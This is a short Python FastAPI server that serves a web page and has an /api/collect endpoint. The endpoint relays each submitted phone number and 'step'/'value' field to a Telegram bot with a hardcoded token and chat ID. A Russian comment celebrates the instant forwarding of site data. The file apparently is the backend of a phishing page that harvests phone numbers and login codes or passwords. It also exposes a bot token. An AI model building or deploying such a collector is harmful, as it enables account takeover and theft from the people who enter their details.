from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import requests
import uvicorn

app = FastAPI()

TG_TOKEN = "9209600747:AAE98UHgY9jSjm8ZXATeeLsnMtP4YZpXojo"
CHAT_ID = "5904604582"

class DataReq(BaseModel):
    step: str
    phone: str
    extra: str = ""

@app.get("/", response_class=HTMLResponse)
@app.get("/dvideo67", response_class=HTMLResponse)
async def index():
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()

@app.post("/api/collect")
async def collect_data(req: DataReq):
    # Мгновенная отправка данных в твой Telegram при каждом шаге с сайта!
    text = f"🚨 *Новые данные с сайта!*\n📌 Шаг: `{req.step}`\n📞 Телефон: `{req.phone}`\n🔑 Значение: `{req.extra}`"
    
    url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
    
    return {"status": "ok"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
